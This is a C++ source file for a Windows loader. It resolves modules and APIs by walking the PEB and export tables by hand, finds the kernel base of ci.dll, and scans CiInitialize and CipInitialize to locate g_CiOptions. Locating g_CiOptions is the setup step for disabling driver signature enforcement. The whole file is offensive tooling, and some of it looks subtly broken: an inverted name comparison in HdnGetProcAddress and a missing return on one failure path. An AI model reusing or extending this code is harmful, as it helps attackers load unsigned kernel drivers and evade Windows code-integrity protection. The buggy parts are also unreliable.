#include "includes.h"
#include "loader.h"
#include <ntstatus.h>

bool loader::CompareStrings( const char* asciiStr, const wchar_t* wideStr ) {
    if ( !asciiStr || !wideStr )
        return false;

    while ( *asciiStr && *wideStr ) {
        // Convert ASCII char to lowercase
        char a = static_cast< char >( tolower( static_cast< unsigned char >( *asciiStr ) ) );

        // Convert wide char to lowercase ASCII char, but only if in ASCII range
        wchar_t w = towlower( *wideStr );
        char wAsChar = ( w < 128 ) ? static_cast< char >( w ) : '?'; // '?' or fail if non-ASCII

        if ( a != wAsChar )
            return false;

        ++asciiStr;
        ++wideStr;
    }

    return ( *asciiStr == '\0' && *wideStr == L'\0' );
}

uintptr_t loader::HdnGetProcAddress( void* hModule, const wchar_t* wAPIName )
{
    unsigned char* lpBase = reinterpret_cast< unsigned char* >( hModule );
    IMAGE_DOS_HEADER* idhDosHeader = reinterpret_cast< IMAGE_DOS_HEADER* >( lpBase );
    if ( idhDosHeader->e_magic == 0x5A4D ) {
        IMAGE_NT_HEADERS64* inhNtHeader = reinterpret_cast< IMAGE_NT_HEADERS64* >( lpBase + idhDosHeader->e_lfanew );
        if ( inhNtHeader->Signature == 0x4550 )
        {
            IMAGE_EXPORT_DIRECTORY* iedExportDirectory = reinterpret_cast< IMAGE_EXPORT_DIRECTORY* >( lpBase + inhNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );
            for ( register unsigned int uiIter = 0; uiIter < iedExportDirectory->NumberOfNames; ++uiIter )
            {
                char* szNames = reinterpret_cast< char* >( lpBase + reinterpret_cast< unsigned long* >( lpBase + iedExportDirectory->AddressOfNames )[uiIter] );
                if ( !CompareStrings( szNames, wAPIName ) )
                {
                    unsigned short usOrdinal = reinterpret_cast< unsigned short* >( lpBase + iedExportDirectory->AddressOfNameOrdinals )[uiIter];
                    std::cout << "[*] Found at 0x" << std::hex << reinterpret_cast< uintptr_t >( lpBase + reinterpret_cast< unsigned long* >( lpBase + iedExportDirectory->AddressOfFunctions )[usOrdinal] );
                    return reinterpret_cast< uintptr_t >( lpBase + reinterpret_cast< unsigned long* >( lpBase + iedExportDirectory->AddressOfFunctions )[usOrdinal] );
                }
            }
        }

    }
    return 0;
}

bool loader::MapCiDllToMemory( const std::wstring& dllPath, LPVOID& mappedBase ) {
    HANDLE hFile = CreateFileW( dllPath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr );
    if ( hFile == INVALID_HANDLE_VALUE ) {
        std::wcerr << L"[-] Failed to open file: " << dllPath << std::endl;
        return false;
    }

    // CreateFileMapping with SEC_IMAGE flag lets us map executable images properly
    HANDLE hMapping = CreateFileMappingW( hFile, nullptr, PAGE_READONLY | SEC_IMAGE, 0, 0, nullptr );
    if ( !hMapping ) {
        std::cerr << "[-] CreateFileMappingW failed.\n";
        CloseHandle( hFile );
        return false;
    }

    mappedBase = MapViewOfFile( hMapping, FILE_MAP_READ, 0, 0, 0 );
    if ( !mappedBase ) {
        std::cerr << "[-] MapViewOfFile failed.\n";
        CloseHandle( hMapping );
        CloseHandle( hFile );
        return false;
    }

    CloseHandle( hMapping );
    CloseHandle( hFile );

    std::wcout << L"[+] Mapped " << dllPath << L" to memory at: " << mappedBase << std::endl;
    return true;
}

void* loader::HdnGetModuleBase( const wchar_t* wModuleName )
{
    PPEB pPeb = ( PPEB )__readgsqword( 0x60 );  // GS:[0x60] = PEB in x64 user-mode
    if ( !pPeb ) {
        std::wcout << L"[!] Failed to get PEB.\n";
        return nullptr;
    }

    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    if ( !pLdr ) {
        std::wcout << L"[!] Failed to get Ldr from PEB.\n";
        return nullptr;
    }

    PLIST_ENTRY pListHead = &pLdr->InMemoryOrderModuleList;
    PLIST_ENTRY pListEntry = pListHead->Flink;

    while ( pListEntry != pListHead )
    {
        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD( pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks );

        if ( pEntry->FullDllName.Buffer ) {
            std::wcout << L"[*] Scanning module: " << pEntry->FullDllName.Buffer << std::endl;
        }

        if ( _wcsicmp( pEntry->FullDllName.Buffer, wModuleName ) == 0 ) {
            std::wcout << L"[+] Found match: " << pEntry->FullDllName.Buffer
                << L" at " << pEntry->DllBase << std::endl;
            return pEntry->DllBase;
        }

        pListEntry = pListEntry->Flink;
    }

    std::wcout << L"[-] Module not found: " << wModuleName << std::endl;
    return nullptr;
}


uintptr_t loader::GetCiDllKernelBase() {
    // Get handle to ntdll.dll and NtQuerySystemInformation
    HMODULE hNtdll = GetModuleHandleW( L"ntdll.dll" );
    if ( !hNtdll ) {
        std::cerr << "[!] Failed to get ntdll.dll handle.\n";
        return 0;
    }

    auto NtQuerySystemInformation = reinterpret_cast< NtQuerySystemInformation_t >(
        GetProcAddress( hNtdll, "NtQuerySystemInformation" ) );
    if ( !NtQuerySystemInformation ) {
        std::cerr << "[!] Failed to get NtQuerySystemInformation address.\n";
        return 0;
    }

    ULONG size = 0;
    NTSTATUS status = NtQuerySystemInformation( SystemModuleInformation, nullptr, 0, &size );
    if ( status != STATUS_INFO_LENGTH_MISMATCH ) {
        std::cerr << "[!] Unexpected NtQuerySystemInformation status: " << std::hex << status << "\n";
        return 0;
    }

    auto buffer = ( PSYSTEM_MODULE_INFORMATION )malloc( size );
    if ( !buffer ) {
        std::cerr << "[!] Failed to allocate memory for system module info.\n";
        return 0;
    }

    status = NtQuerySystemInformation( SystemModuleInformation, buffer, size, &size );
    if ( !NT_SUCCESS( status ) ) {
        std::cerr << "[!] NtQuerySystemInformation failed: " << std::hex << status << "\n";
        free( buffer );
        return 0;
    }

    uintptr_t ciBase = 0;
    for ( ULONG i = 0; i < buffer->NumberOfModules; i++ ) {
        char* moduleName = ( char* )( buffer->Modules[i].FullPathName + buffer->Modules[i].OffsetToFileName );
        if ( _stricmp( moduleName, "ci.dll" ) == 0 ) {
            std::cout << "[*] Found ci.dll kernel base at: 0x" << std::hex << ( uintptr_t )buffer->Modules[i].ImageBase << std::endl;
            ciBase = ( uintptr_t )buffer->Modules[i].ImageBase;
            break;
        }
    }

    free( buffer );
    return ciBase;
}


int32_t loader::ReadRelOffset( const BYTE* addr ) {
    return *reinterpret_cast< const int32_t* >( addr + 1 );
}

uintptr_t loader::GetCipInitializeAddr( uintptr_t CiInitialize ) {
    BYTE* code = reinterpret_cast< BYTE* >( CiInitialize );

    for ( int i = 0; i < 20; ++i ) {
        if ( code[i] == 0xE8 ) {
            int32_t rel = *reinterpret_cast< int32_t* >( &code[i + 1] );
            uintptr_t CipInitialize = CiInitialize + i + 5 + rel;

            std::cout << "[*] Found call at +0x" << std::hex << i
                << " CipInitialize = 0x" << CipInitialize << std::endl;
            return CipInitialize;
        }
    }

    std::cerr << "[-] Failed to find CipInitialize via call in CiInitialize" << std::endl;
}

uintptr_t loader::Get_gCiOptions_Addr( uintptr_t CipInitialize, uintptr_t mappedBase, uintptr_t kernelBase ) {
    BYTE* code = reinterpret_cast< BYTE* >( CipInitialize );

    for ( int i = 0; i < 32; ++i ) {
        if ( code[i] == 0x48 && code[i + 1] == 0x8D && code[i + 2] == 0x0D ) {
            int32_t rel = *reinterpret_cast< int32_t* >( &code[i + 3] );
            uintptr_t gCiOptionsMapped = CipInitialize + i + 7 + rel;

            std::cout << "[*] gCiOptions (mapped VA): 0x" << std::hex << gCiOptionsMapped << std::endl;

            uintptr_t gCiOptionsKernel = kernelBase + ( gCiOptionsMapped - mappedBase );
            std::cout << "[*] gCiOptions (kernel VA): 0x" << std::hex << gCiOptionsKernel << std::endl;

            return gCiOptionsKernel;
        }
    }

    std::cerr << "[-] Failed to locate gCiOptions LEA in CipInitialize" << std::endl;
    return 0;
}

